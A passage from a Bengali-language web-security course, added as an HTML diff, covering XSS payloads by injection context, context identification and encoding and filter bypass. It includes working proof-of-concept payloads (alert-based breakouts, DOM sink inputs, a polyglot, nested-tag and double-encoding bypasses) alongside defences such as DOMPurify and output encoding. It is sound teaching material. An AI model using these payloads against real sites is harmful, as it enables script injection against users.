+  <p><strong>ব্যাখ্যা:</strong> যদি developer attribute-এর মান quote দিয়ে না ঘেরেন (unquoted attribute — dangerous practice), তাহলে শুধু একটি স্পেস দিয়েই নতুন attribute শুরু করা যায়, কোনো quote breakout লাগে না। <strong>কেন কাজ নাও করতে পারে:</strong> যদি developer সবসময় quote ব্যবহার করেন এবং quote character encode করেন (<code>"</code> → <code>&amp;#34;</code>)।</p>
+
+  <h2>৪. JavaScript String Context Payloads</h2>
+  <div class="codeblock"><div class="cb-head"><span>JS string breakout</span><button class="copy-btn">কপি</button></div><pre><code>Input context:  &lt;script&gt;var x = "INPUT";&lt;/script&gt;
+Payload:        ";alert(1);//
+ফলাফল:          &lt;script&gt;var x = "";alert(1);//";&lt;/script&gt;</code></pre></div>
+  <p><strong>ব্যাখ্যা:</strong> প্রথমে quote বন্ধ করে বর্তমান statement শেষ (<code>;</code>) করা হয়, তারপর নতুন statement (<code>alert(1)</code>) যোগ করা হয়, এবং বাকি লাইন কমেন্ট (<code>//</code>) করে নিষ্ক্রিয় করে দেওয়া হয় যাতে syntax error না হয়।</p>
+
+  <h2>৫. URL Context Analysis</h2>
+  <div class="codeblock"><div class="cb-head"><span>javascript: স্কিম</span><button class="copy-btn">কপি</button></div><pre><code>Input context: &lt;a href="INPUT"&gt;লিঙ্ক&lt;/a&gt;
+Payload:       javascript:alert(document.domain)
+ফলাফল:         &lt;a href="javascript:alert(document.domain)"&gt;লিঙ্ক&lt;/a&gt;</code></pre></div>
+  <p><strong>ব্যাখ্যা:</strong> <code>javascript:</code> একটি বিশেষ URL স্কিম, যা ক্লিক করলে URL নেভিগেট করার বদলে ভেতরের কোড execute করে। <strong>গুরুত্বপূর্ণ সীমাবদ্ধতা:</strong> এটি শুধুমাত্র তখনই কাজ করে যখন ভিকটিম সেই লিঙ্কে সরাসরি ক্লিক করেন (অটো-execute হয় না) — তাই এটি অন্য পেলোডের তুলনায় কম নির্ভরযোগ্য, এবং আধুনিক ব্রাউজার কিছু ক্ষেত্রে এটি সীমিত করেছে।</p>
+
+  <h2>৬. Event-Handler-Based Examples</h2>
+  <table>
+    <thead><tr><th>Event handler</th><th>কখন trigger হয়</th></tr></thead>
+    <tbody>
+      <tr><td><code>onerror</code></td><td>Resource load ব্যর্থ হলে (img, script, audio)</td></tr>
+      <tr><td><code>onload</code></td><td>Resource/element সফলভাবে load হলে (svg, body, img)</td></tr>
+      <tr><td><code>onfocus</code> / <code>autofocus</code></td><td>Element focus পেলে — <code>autofocus</code> দিয়ে স্বয়ংক্রিয়ভাবে trigger করা যায়</td></tr>
+      <tr><td><code>onmouseover</code></td><td>ভিকটিম মাউস দিয়ে hover করলে</td></tr>
+      <tr><td><code>ontoggle</code></td><td><code>&lt;details open ontoggle=...&gt;</code> — পেজ লোড হওয়ার সাথে সাথেই</td></tr>
+    </tbody>
+  </table>
+  <div class="codeblock"><div class="cb-head"><span>Autofocus দিয়ে interaction ছাড়াই trigger</span><button class="copy-btn">কপি</button></div><pre><code>&lt;input autofocus onfocus=alert(1)&gt;</code></pre></div>
+
+  <h2>৭. Reflected, Stored ও DOM XSS প্যাটার্ন</h2>
+  <p>উপরের সব payload reflected ও stored — উভয় ক্ষেত্রেই একইভাবে কাজ করে, পার্থক্য শুধু payload কোথা থেকে আসছে তাতে। DOM-based context-এ টেস্ট করার সময় sink অনুযায়ী আলাদা পেলোড লাগে:</p>
+  <div class="codeblock"><div class="cb-head"><span>DOM sink-নির্দিষ্ট পেলোড উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>// sink: element.innerHTML = location.hash.slice(1)
+URL: #&lt;img src=x onerror=alert(1)&gt;
+
+// sink: eval(location.search.slice(1))
+URL: ?alert(1)
+
+// sink: document.write(decodeURIComponent(location.search))
+URL: ?%3Cscript%3Ealert(1)%3C/script%3E</code></pre></div>
+
+  <h2>৮. Sanitization Testing ও Encoding Analysis</h2>
+  <p>একটি filter/sanitizer কীভাবে input পরিবর্তন করছে তা বোঝার জন্য একটি করে বিশেষ ক্যারেক্টার আলাদাভাবে পাঠিয়ে response পর্যবেক্ষণ করুন:</p>
+  <div class="codeblock"><div class="cb-head"><span>Character probing</span><button class="copy-btn">কপি</button></div><pre><code>Test: &lt;
+Observe response: &amp;lt;  → encode হচ্ছে (ভালো লক্ষণ, কিন্তু শুধু এই একটি character না)
+Observe response: &lt;     → encode হচ্ছে না (সম্ভাব্য vulnerability)
+
+Test: &lt;script&gt;
+Observe: সম্পূর্ণ strip (ফাঁকা) হলে → blocklist filtering হচ্ছে, bypass সম্ভব হতে পারে</code></pre></div>
+  <p>অধ্যায় ৬-এ এনকোডিং ও filter bypass আরও বিস্তারিতভাবে আলোচিত হয়েছে।</p>
+
+  <h2>৯. Polyglot Payload-এর ধারণা</h2>
+  <p>একটি <strong>polyglot payload</strong> এমনভাবে তৈরি করা হয় যাতে এটি একাধিক context-এ (HTML, attribute, JS string) একইসাথে কার্যকর হতে পারে — টেস্টিং দ্রুত করার জন্য ব্যবহৃত হয়, যখন context আগে থেকে নিশ্চিত না।</p>
+  <div class="codeblock"><div class="cb-head"><span>একটি পরিচিত polyglot উদাহরণ (ব্যাখ্যাসহ)</span><button class="copy-btn">কপি</button></div><pre><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;svg/onload=alert(1)&gt;</code></pre></div>
+  <p><strong>ব্যাখ্যা:</strong> এই পেলোডের প্রতিটি অংশ ভিন্ন একটি context টার্গেট করে — <code>jaVasCript:</code> অংশ URL context-এর জন্য, মাঝের কমেন্ট/ব্রেকআউট অংশ বিভিন্ন ট্যাগ বন্ধ করার জন্য, এবং শেষের <code>&lt;svg onload&gt;</code> HTML context-এর জন্য। এটি একটি <em>probe</em> হিসেবে কাজ করে, নিখুঁত production payload হিসেবে নয় — আসল testing-এ context শনাক্ত করে targeted payload ব্যবহার করাই বেশি কার্যকর ও নির্ভরযোগ্য।</p>
+
+  <h2>১০. Common Payload Failures — কেন পেলোড কাজ করে না</h2>
+  <table>
+    <thead><tr><th>কারণ</th><th>লক্ষণ</th><th>পরবর্তী ধাপ</th></tr></thead>
+    <tbody>
+      <tr><td>Output encoding</td><td>Response-এ <code>&amp;lt;script&amp;gt;</code> দেখা যাচ্ছে</td><td>Context ভুলভাবে ধরা হয়েছে কি না যাচাই করুন; encoding bypass সাধারণত সম্ভব না যদি সঠিকভাবে করা থাকে</td></tr>
+      <tr><td>Blocklist filtering</td><td>নির্দিষ্ট keyword (<code>script</code>, <code>onerror</code>) সরিয়ে ফেলা হচ্ছে</td><td>Case variation, নেস্টেড ট্যাগ, বিকল্প event handler চেষ্টা করুন (অধ্যায় ৬)</td></tr>
+      <tr><td>CSP (Content-Security-Policy)</td><td>Console-এ "Refused to execute inline script" error</td><td>CSP policy পড়ে দেখুন কোন সোর্স অনুমোদিত, bypass সম্ভব কি না বিশ্লেষণ করুন (অধ্যায় ৮)</td></tr>
+      <tr><td>ভুল context ধারণা</td><td>Payload response-এ দেখা যাচ্ছে কিন্তু execute হচ্ছে না</td><td>DevTools দিয়ে প্রকৃত surrounding HTML পরীক্ষা করুন (অধ্যায় ৫)</td></tr>
+      <tr><td>Framework auto-escaping</td><td>React/Angular/Vue টেক্সট হিসেবে দেখাচ্ছে, HTML হিসেবে না</td><td>Framework-নির্দিষ্ট unsafe API খুঁজুন (অধ্যায় ৯)</td></tr>
+    </tbody>
+  </table>
+  <div class="callout info"><div class="ic">💡</div><p>কোনো একটি payload কাজ না করা মানেই vulnerability নেই তা প্রমাণ করে না — এটি শুধু বোঝায় যে <em>এই নির্দিষ্ট</em> payload-টি, এই নির্দিষ্ট defense-এর বিরুদ্ধে কাজ করেনি। পদ্ধতিগতভাবে (context শনাক্ত → filter বোঝা → লক্ষ্যভিত্তিক payload) এগোনো জরুরি।</p></div>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>একটি input field attribute context-এ বসছে, এবং আপনি দেখলেন <code>"</code> ক্যারেক্টার <code>&amp;quot;</code>-এ encode হয়ে যাচ্ছে কিন্তু <code>'</code> (single quote) অপরিবর্তিত থাকছে। কোন ধরনের payload চেষ্টা করবেন, এবং কেন?</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>প্রতিটি পেলোড একটি নির্দিষ্ট context ও defense পরিস্থিতির জন্য ডিজাইন করা — কোনো একক "magic payload" সবসময় কাজ করে না। পদ্ধতিগত testing (context শনাক্তকরণ → filter আচরণ বোঝা → উপযুক্ত payload নির্বাচন) সবসময় একক মুখস্থ payload-এর চেয়ে বেশি কার্যকর।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li><code>&lt;img src=x onerror=...&gt;</code> কেন <code>&lt;script&gt;</code> ট্যাগ ফিল্টার হলেও কাজ করতে পারে?</li>
+      <li>Polyglot payload ব্যবহারের সুবিধা ও সীমাবদ্ধতা কী?</li>
+      <li>একটি payload response-এ দেখা যাচ্ছে কিন্তু execute হচ্ছে না — সম্ভাব্য তিনটি কারণ বলুন।</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter03"><span>পূর্ববর্তী</span>অধ্যায় ০৩</a>
+    <a class="next" href="/chapter05"><span>পরবর্তী</span>অধ্যায় ০৫ — কনটেক্সট শনাক্তকরণ</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 5 — Context Identification
+========================================================= -->
+<section class="chapter" id="chapter05">
+  <div class="eyebrow">অধ্যায় ০৫ · পদ্ধতি</div>
+  <h1>Context Identification</h1>
+  <p class="sub">সঠিক payload বেছে নেওয়ার আগে, input ঠিক কোথায় ও কীভাবে বসছে তা নির্ভুলভাবে শনাক্ত করা — এটিই দক্ষ XSS টেস্টিংয়ের কেন্দ্রীয় দক্ষতা।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এই অধ্যায়ের পদ্ধতি শুধুমাত্র নিজের lab বা অনুমোদিত/scope-ভুক্ত পরিবেশে প্রয়োগ করুন।</p></div>
+
+  <h2>Reflection Point শনাক্ত করা</h2>
+  <p>প্রথম ধাপ হলো — অ্যাপ্লিকেশনের কোন কোন input (URL parameter, form field, header, cookie) output-এ কোথাও "প্রতিফলিত" (reflected) হয় তা খুঁজে বের করা। এর জন্য একটি <strong>unique, harmless marker string</strong> পাঠানো সবচেয়ে নির্ভরযোগ্য পদ্ধতি।</p>
+  <div class="codeblock"><div class="cb-head"><span>Marker-ভিত্তিক শনাক্তকরণ</span><button class="copy-btn">কপি</button></div><pre><code>প্রতিটি input-এ পাঠান: zzXSSmarker12345zz
+
+তারপর response-এ (Ctrl+F দিয়ে) "zzXSSmarker12345zz" খুঁজুন —
+কোথায় কোথায় এটি দেখা যাচ্ছে তা নোট করুন।</code></pre></div>
+  <p>Unique marker ব্যবহারের কারণ: সাধারণ শব্দ (যেমন <code>test</code>) পেজে আগে থেকেই থাকতে পারে, যা false positive তৈরি করবে। একটি random, dictionary-তে না থাকা স্ট্রিং নিশ্চিত করে যে reflection আসলে আপনার input থেকেই আসছে।</p>
+
+  <h2>Context অনুযায়ী বিশ্লেষণ</h2>
+  <p>Marker যেখানে দেখা যাচ্ছে, সেই জায়গার ঠিক আশেপাশের raw HTML (Browser DevTools-এর "View Page Source" বা Network tab-এর raw response ব্যবহার করুন, rendered DOM না — কারণ ব্রাউজার ইতিমধ্যে কিছু normalize করে ফেলতে পারে) দেখে context নির্ধারণ করুন।</p>
+
+  <div class="grid2">
+    <div class="card"><h4>HTML Context চেনার উপায়</h4><p>Marker দুটি ট্যাগের মাঝে, কোনো quote বা বিশেষ সিনট্যাক্সের মধ্যে না — যেমন <code>&lt;p&gt;zzXSSmarker12345zz&lt;/p&gt;</code>।</p></div>
+    <div class="card"><h4>Attribute Context চেনার উপায়</h4><p>Marker একটি <code>attr="..."</code>-এর ভেতরে — যেমন <code>&lt;input value="zzXSSmarker12345zz"&gt;</code>। লক্ষ্য করুন quote single না double।</p></div>
+    <div class="card"><h4>JavaScript String Context চেনার উপায়</h4><p>Marker একটি <code>&lt;script&gt;</code> ব্লকের ভেতরে, quote দিয়ে ঘেরা একটি variable-এর মান হিসেবে — যেমন <code>var x = "zzXSSmarker12345zz";</code>।</p></div>
+    <div class="card"><h4>URL Context চেনার উপায়</h4><p>Marker একটি <code>href</code>/<code>src</code> attribute-এর সম্পূর্ণ বা আংশিক মান হিসেবে বসছে।</p></div>
+  </div>
+
+  <h2>Nested Contexts — একাধিক স্তরের জটিলতা</h2>
+  <p>কখনো কখনো input একাধিক স্তরের মধ্যে নেস্টেড থাকে — যেমন একটি JavaScript string-এর ভেতরে, যা নিজে একটি HTML attribute-এর ভেতরে বসে আছে (inline event handler attribute, যেমন <code>onclick="doSearch('INPUT')"</code>)। এখানে payload-কে প্রথমে JS string থেকে বের হতে হয়, তারপর প্রয়োজনে attribute থেকেও।</p>
+  <div class="codeblock"><div class="cb-head"><span>Nested context উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>আসল HTML:
+&lt;button onclick="search('INPUT')"&gt;খুঁজুন&lt;/button&gt;
+
+Payload: '-alert(1)-'
+ফলাফল:
+&lt;button onclick="search(''-alert(1)-'')"&gt;খুঁজুন&lt;/button&gt;
+→ প্রথমে single-quote দিয়ে JS string বন্ধ, তারপর `-` দিয়ে
+  expression-এর অংশ হিসেবে alert(1) বসানো হয়েছে।</code></pre></div>
+
+  <h2>Browser Inspector ব্যবহার করে Context যাচাই</h2>
+  <p>Chrome/Firefox DevTools-এর <strong>Elements</strong> প্যানেলে marker সার্চ করে দেখুন সেটি কোন DOM node-এর ভেতরে আছে — Elements panel প্রকৃত rendered DOM দেখায়, যা raw source থেকে কিছুটা ভিন্ন হতে পারে (ব্রাউজার malformed HTML কে auto-correct করে ফেলে)। তাই raw response (View Source / Network tab) ও rendered DOM — দুটোই পরীক্ষা করা ভালো অভ্যাস।</p>
+
+  <h2>Source-to-Sink Tracing (DOM-based context-এর জন্য)</h2>
+  <p>DOM-based XSS-এর ক্ষেত্রে marker পাঠানো যথেষ্ট না, কারণ সার্ভার response-এ কিছু দেখা যাবে না। এখানে করণীয়:</p>
+  <ol>
+    <li>পেজের JavaScript সোর্স (DevTools-এর Sources প্যানেল) খুলুন।</li>
+    <li><code>location</code>, <code>document.URL</code>, <code>document.referrer</code>, <code>window.name</code> ইত্যাদি কোথায় পড়া হচ্ছে তা খুঁজুন (এগুলো সম্ভাব্য source)।</li>
+    <li>সেই ভ্যারিয়েবল কোথায় ব্যবহৃত হচ্ছে তা অনুসরণ করুন — বিশেষ করে <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>-এর মতো sink-এ পৌঁছায় কি না দেখুন।</li>
+    <li>DevTools-এর "Add breakpoint" ফিচার (DOM mutation breakpoint বা XHR breakpoint) ব্যবহার করে কোন কোড চলছে তা ধাপে ধাপে অনুসরণ করুন।</li>
+  </ol>
+  <p>অধ্যায় ৭-এ Burp Suite-এর DOM Invader এক্সটেনশন এই কাজ অনেকটা স্বয়ংক্রিয় করে দেয়, তা দেখানো হয়েছে।</p>
+
+  <h2>Payload নির্বাচন — Decision Flow</h2>
+  <div class="codeblock"><div class="cb-head"><span>সরলীকৃত সিদ্ধান্ত প্রক্রিয়া</span></div><pre><code>১. Marker পাঠান → reflection আছে কি না দেখুন
+২. আছে হলে → raw response-এ marker-এর আশেপাশের সিনট্যাক্স দেখুন
+৩. HTML text context? → &lt;script&gt;alert(1)&lt;/script&gt; বা &lt;svg onload=alert(1)&gt;
+৪. Attribute context (quoted)? → "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+৫. Attribute context (unquoted)? → x onmouseover=alert(1)
+৬. JS string context? → ";alert(1);//
+৭. URL context? → javascript:alert(1)  (ক্লিক-নির্ভর সীমাবদ্ধতা মাথায় রাখুন)
+৮. কোনো reflection নেই? → DOM-based/stored/blind সম্ভাবনা বিবেচনা করুন</code></pre></div>
+
+  <h2>সাধারণ ভুল (Common Mistakes)</h2>
+  <ul>
+    <li><strong>Rendered DOM-কে raw response ভাবা:</strong> ব্রাউজার malformed HTML normalize করে ফেলে, তাই Elements panel সবসময় প্রকৃত server response প্রতিফলিত করে না।</li>
+    <li><strong>একটি payload সব জায়গায় চেষ্টা করা:</strong> context না বুঝে একই <code>&lt;script&gt;</code> পেলোড বারবার পাঠানো অধিকাংশ ক্ষেত্রে ব্যর্থ হবে এবং সময় নষ্ট করবে।</li>
+    <li><strong>Case-sensitivity ভুলে যাওয়া:</strong> HTML attribute/tag নাম case-insensitive হলেও, JavaScript ভ্যারিয়েবল নাম/স্ট্রিং case-sensitive।</li>
+    <li><strong>শুধু প্রথম reflection দেখে থেমে যাওয়া:</strong> একই input একাধিক জায়গায় (একাধিক context-এ) প্রতিফলিত হতে পারে — সবগুলো যাচাই করা উচিত।</li>
+  </ul>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>নিচের raw HTML response-এ marker-এর অবস্থান দেখে context চিহ্নিত করুন এবং একটি উপযুক্ত payload প্রস্তাব করুন:</p>
+    <div class="codeblock"><pre><code>&lt;script&gt;
+  var greeting = 'zzXSSmarker12345zz';
+  document.getElementById('g').textContent = greeting;
+&lt;/script&gt;</code></pre></div>
+    <p>ইঙ্গিত: এখানে sink (<code>textContent</code>) ও context — দুটোই বিবেচনা করুন।</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>Context identification হলো unique marker দিয়ে reflection point খুঁজে বের করা, raw response-এ তার আশেপাশের syntax বিশ্লেষণ করা, এবং সেই অনুযায়ী payload নির্বাচন করা। DOM-based ক্ষেত্রে এর বদলে source-to-sink tracing প্রয়োজন। ভুল context ধরে নেওয়া সবচেয়ে সাধারণ এবং সময়-অপচয়কারী ভুল।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Raw response ও rendered DOM পরীক্ষা করা কেন দুটোই গুরুত্বপূর্ণ?</li>
+      <li>Nested context-এর একটি বাস্তব উদাহরণ দিন এবং তার জন্য payload কীভাবে তৈরি করবেন ব্যাখ্যা করুন।</li>
+      <li>DOM-based vulnerability শনাক্ত করতে marker পাঠানো কেন যথেষ্ট নয়?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter04"><span>পূর্ববর্তী</span>অধ্যায় ০৪</a>
+    <a class="next" href="/chapter06"><span>পরবর্তী</span>অধ্যায় ০৬ — এনকোডিং ও ফিল্টার বাইপাস</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 6 — Encoding, Sanitization and Filter Bypass
+========================================================= -->
+<section class="chapter" id="chapter06">
+  <div class="eyebrow">অধ্যায় ০৬ · ভিত্তি</div>
+  <h1>Encoding, Sanitization and Filter Bypass</h1>
+  <p class="sub">কেন encoding কাজ করে, filter-এর সীমাবদ্ধতা কোথায়, এবং defensive দৃষ্টিকোণ থেকে এসব প্যাটার্ন বোঝা কেন গুরুত্বপূর্ণ।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এই অধ্যায়ের bypass-সংক্রান্ত আলোচনা defensive/analytical উদ্দেশ্যে — যাতে আপনি নিজের বা অনুমোদিত অ্যাপ্লিকেশনের filter-এর দুর্বলতা বুঝে তা ঠিক করতে পারেন। অনুমতি ছাড়া কোনো সিস্টেমে প্রয়োগ নিষিদ্ধ।</p></div>
+
+  <h2>HTML Entity Encoding</h2>
+  <p>HTML entity encoding বিশেষ ক্যারেক্টারকে তাদের "টেক্সট প্রতিনিধি" রূপে রূপান্তরিত করে, যাতে ব্রাউজার সেগুলোকে markup হিসেবে নয়, শুধু প্রদর্শনযোগ্য টেক্সট হিসেবে treat করে।</p>
+  <table>
+    <thead><tr><th>Character</th><th>HTML Entity</th></tr></thead>
+    <tbody>
+      <tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td></tr>
+      <tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td></tr>
+      <tr><td><code>"</code></td><td><code>&amp;quot;</code> / <code>&amp;#34;</code></td></tr>
+      <tr><td><code>'</code></td><td><code>&amp;#39;</code> / <code>&amp;apos;</code></td></tr>
+      <tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td></tr>
+    </tbody>
+  </table>
+  <p>সঠিকভাবে প্রয়োগ করলে HTML text context-এ এটি প্রায় সম্পূর্ণ সুরক্ষা দেয় — কারণ <code>&lt;</code>/<code>&gt;</code> encode হয়ে গেলে নতুন ট্যাগ তৈরিই সম্ভব হয় না। কিন্তু মনে রাখা জরুরি: এই এনকোডিং শুধু <em>HTML text</em> context-এর জন্য উপযুক্ত — attribute, JS string বা URL context-এ একই এনকোডিং যথেষ্ট না হতে পারে।</p>
+
+  <h2>JavaScript Escaping</h2>
+  <p>JavaScript string literal-এর ভেতরে বিশেষ ক্যারেক্টার escape করতে হয় ব্যাকস্ল্যাশ দিয়ে — যেমন <code>"</code> → <code>\"</code>, <code>'</code> → <code>\'</code>, newline → <code>\n</code>। তবে, <strong>শুধু JS escaping যথেষ্ট না যদি ডেটা পরে HTML-এও বসে</strong> — কারণ JS escaping <code>&lt;</code>/<code>&gt;</code>-কে প্রভাবিত করে না, এবং যদি সেই string পরবর্তীতে <code>innerHTML</code>-এ ব্যবহৃত হয়, HTML injection সম্ভব থেকে যায়। এই কারণেই "context-aware" encoding — অর্থাৎ ডেটা শেষ পর্যন্ত কোথায় ব্যবহৃত হচ্ছে তার সবগুলো স্তর বিবেচনা করে encode করা — এত গুরুত্বপূর্ণ।</p>
+
+  <h2>URL Encoding</h2>
+  <p>URL-এ বিশেষ ক্যারেক্টার percent-encoding (<code>%XX</code>) দিয়ে প্রকাশ করা হয় — যেমন স্পেস → <code>%20</code>, <code>&lt;</code> → <code>%3C</code>। এটি মূলত URL-এর গঠন বজায় রাখার জন্য, নিরাপত্তার জন্য নয় — ব্রাউজার/সার্ভার decode করার পর সেই ভ্যালু আবার তার আসল রূপে ফিরে যায় এবং তখন HTML/JS context-এর নিয়মই প্রযোজ্য হয়।</p>
+
+  <h2>Unicode Interpretation</h2>
+  <p>ব্রাউজার বিভিন্ন Unicode representation (যেমন <code>&amp;#x3C;</code> হিসেবে <code>&lt;</code>, অথবা full-width ক্যারেক্টার) কে normalize করে ফেলতে পারে। যদি একটি sanitizer শুধু ASCII <code>&lt;</code>/<code>&gt;</code> চেক করে, কিন্তু ব্রাউজার Unicode variant-কেও normalize করে চেনে, তাহলে একটি ফাঁক তৈরি হতে পারে। এটি এনকোডিং-ভিত্তিক filter bypass-এর একটি ক্লাসিক কারণ।</p>
+
+  <h2>Input Validation ও Output Encoding — পার্থক্য</h2>
+  <div class="grid2">
+    <div class="card"><h4>Input Validation</h4><p>ডেটা গ্রহণ করার সময় তার ফরম্যাট/গঠন যাচাই করা (যেমন ইমেইল ফিল্ডে শুধু ইমেইল-সদৃশ টেক্সট গ্রহণ করা)। এটি প্রথম স্তরের ফিল্টার, কিন্তু একমাত্র রক্ষাকবচ হিসেবে যথেষ্ট না — কারণ অনেক বৈধ input (যেমন নাম ফিল্ডে "O'Brien")-এ বিশেষ ক্যারেক্টার থাকতে পারে।</p></div>
+    <div class="card"><h4>Output Encoding</h4><p>ডেটা প্রদর্শনের সময়, সেই মুহূর্তের context অনুযায়ী এনকোড করা। এটিই XSS প্রতিরোধের মূল ও সবচেয়ে নির্ভরযোগ্য স্তর, কারণ এটি data কোথায় ব্যবহৃত হচ্ছে তার উপর ভিত্তি করে কাজ করে, input কেমন ছিল তার উপর নয়।</p></div>
+  </div>
+
+  <h2>Allowlist বনাম Blocklist</h2>
+  <table>
+    <thead><tr><th>পদ্ধতি</th><th>কাজ করার ধরন</th><th>সমস্যা/সুবিধা</th></tr></thead>
+    <tbody>
+      <tr><td>Blocklist</td><td>নির্দিষ্ট "খারাপ" keyword/ক্যারেক্টার (যেমন <code>&lt;script&gt;</code>) বাদ দেওয়া</td><td>সহজে bypass হয় — নতুন variant/encoding/case সবসময় মিস হয়ে যেতে পারে</td></tr>
+      <tr><td>Allowlist</td><td>শুধুমাত্র পূর্বনির্ধারিত "নিরাপদ" ট্যাগ/attribute/প্যাটার্ন অনুমোদন করা, বাকি সব বাদ</td><td>অনেক বেশি নির্ভরযোগ্য — কারণ অজানা/নতুন bypass প্যাটার্নও ডিফল্টভাবে বাদ পড়ে যায়</td></tr>
+    </tbody>
+  </table>
+  <p>Rich-text input (যেমন একটি ব্লগ এডিটর) sanitize করার সময় সবসময় allowlist-ভিত্তিক পদ্ধতি (যেমন নির্দিষ্ট কয়েকটি ট্যাগ — <code>b</code>, <code>i</code>, <code>a</code> — এবং নির্দিষ্ট attribute শুধু অনুমোদন করা) ব্যবহার করা উচিত, কখনো blocklist না।</p>
+
+  <h2>Regex Filter-এর সীমাবদ্ধতা</h2>
+  <p>অনেক naive filter একটি regex দিয়ে <code>&lt;script.*?&gt;</code>-এর মতো প্যাটার্ন বাদ দেওয়ার চেষ্টা করে। এর কয়েকটি সাধারণ দুর্বলতা:</p>
+  <ul>
+    <li><strong>Case sensitivity ভুল:</strong> <code>&lt;ScRiPt&gt;</code> regex-টি case-insensitive না হলে পাস হয়ে যাবে।</li>
+    <li><strong>নেস্টেড ট্যাগ:</strong> একটি naive filter যদি শুধু একবার <code>&lt;script&gt;</code> স্ট্রিপ করে, তাহলে <code>&lt;scr&lt;script&gt;ipt&gt;</code>-এর মতো ইনপুট (যেখানে ভেতরের <code>&lt;script&gt;</code> সরানোর পর বাইরের অংশ জোড়া লেগে আসল ট্যাগ তৈরি হয়ে যায়) bypass করতে পারে।</li>
+    <li><strong>সীমিত keyword তালিকা:</strong> filter হয়তো <code>script</code>, <code>onerror</code> আটকায় কিন্তু <code>onfocus</code>, <code>onanimationstart</code>-এর মতো কম পরিচিত event বাদ দিতে ভুলে যায়।</li>
+    <li><strong>শুধু নির্দিষ্ট ট্যাগ আটকানো:</strong> <code>&lt;script&gt;</code> আটকালেও <code>&lt;svg&gt;</code>, <code>&lt;math&gt;</code>, <code>&lt;iframe&gt;</code>-এর মতো বিকল্প vector বিবেচনা না করা।</li>
+  </ul>
+  <div class="codeblock"><div class="cb-head"><span>Naive filter bypass-এর ধারণাগত উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>Filter rule (naive): remove the substring "&lt;script&gt;" once
+
+Input:  &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
+After removing inner "&lt;script&gt;" once from each:
+Result: &lt;script&gt;alert(1)&lt;/script&gt;
+→ ফিল্টার করার পরেও একটি সম্পূর্ণ, কার্যকর script ট্যাগ তৈরি হয়ে যায়।</code></pre></div>
+
+  <h2>Double Encoding</h2>
+  <p>কখনো কখনো একটি অ্যাপ্লিকেশন input-কে একাধিকবার decode করে (যেমন URL-decode একবার framework-লেভেলে, আরেকবার application কোডে)। যদি filtering প্রথম decode-এর আগে/পরে ভুল পর্যায়ে বসানো হয়, তাহলে একটি double-encoded payload (<code>%253Cscript%253E</code>, যা decode হয়ে প্রথমে <code>%3Cscript%3E</code> এবং পরে <code>&lt;script&gt;</code> হয়) filter কে ফাঁকি দিতে পারে।</p>
+
+  <h2>Browser Parsing Differences</h2>
+  <p>বিভিন্ন ব্রাউজার (এবং একই ব্রাউজারের বিভিন্ন সংস্করণ) malformed বা অস্বাভাবিক HTML কে সামান্য ভিন্নভাবে parse/normalize করতে পারে। একটি filter যা একটি নির্দিষ্ট ব্রাউজারের আচরণ ধরে নিয়ে লেখা হয়েছে, অন্য ব্রাউজারে ভিন্ন ফলাফল দিতে পারে — এটিই mutation XSS (অধ্যায় ৩)-এর একটি মূল কারণ।</p>
+
+  <h2>DOMPurify-এর নিরাপদ ব্যবহার</h2>
+  <p><strong>DOMPurify</strong> একটি সুপরিচিত, সক্রিয়ভাবে রক্ষণাবেক্ষণ করা open-source HTML sanitization লাইব্রেরি, যা allowlist-ভিত্তিক পদ্ধতিতে কাজ করে এবং পরিচিত mutation XSS প্যাটার্নের বিরুদ্ধে regularly টেস্ট করা হয়।</p>
+  <div class="codeblock"><div class="cb-head"><span>সঠিক ব্যবহার</span><button class="copy-btn">কপি</button></div><pre><code>// নিরাপদ: DOMPurify দিয়ে sanitize করার পরই innerHTML-এ বসানো
+const clean = DOMPurify.sanitize(userSuppliedHTML);
+element.innerHTML = clean;
+
+// ভুল: sanitize করেও পুরনো/misconfigured ভার্সন ব্যবহার করা,
+// অথবা sanitize করার পর আবার অন্য কোনো concatenation করা</code></pre></div>
+  <div class="callout warn"><div class="ic">⚠️</div><p>নিজে regex দিয়ে sanitizer লেখা কখনো নিরাপদ বিকল্প নয় — HTML parsing এতটাই জটিল ও edge-case-নির্ভর যে শুধুমাত্র browser-grade, ব্যাপকভাবে পরীক্ষিত লাইব্রেরিই নির্ভরযোগ্য সুরক্ষা দিতে পারে।</p></div>
+
+  <h2>Context-Aware Remediation — সারসংক্ষেপ টেবিল</h2>
+  <table>
+    <thead><tr><th>Context</th><th>সঠিক প্রতিরক্ষা</th></tr></thead>
+    <tbody>
+      <tr><td>HTML text</td><td>HTML entity encoding (<code>&lt;</code>,<code>&gt;</code>,<code>&amp;</code>)</td></tr>
+      <tr><td>HTML attribute</td><td>Attribute encoding (<code>"</code>,<code>'</code>) + সবসময় quote ব্যবহার</td></tr>
